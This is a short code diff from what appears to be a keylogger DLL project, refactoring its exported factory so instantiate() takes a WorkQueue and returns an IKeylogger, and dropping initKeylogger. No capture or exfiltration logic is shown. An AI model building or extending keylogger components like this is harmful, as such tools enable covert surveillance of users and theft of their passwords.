@@ -1,14 +1,10 @@
 #include				"keylogger_dll\KeyloggerDLL.h"
+#include "WorkQueue.h"
 
-Keylogger*				instantiate()
+IKeylogger*				instantiate(WorkQueue &item)
 {
-	Keylogger*			keylogger = new Keylogger();
+	IKeylogger			*keylogger = new Keylogger(item);
 	return keylogger;
-}
-
-bool					initKeylogger(Keylogger* keylogger)
-{
-	return keylogger->init();
 }
 
 extern "C" {
@@ -22,8 +18,6 @@ extern "C" {
 
 		// List every usefull functions out there
 		(*dict)["instantiate"] = (void *)&instantiate;
-		(*dict)["initKeylogger"] = (void*)&initKeylogger;
-
 		return (dict);
 	}
 }
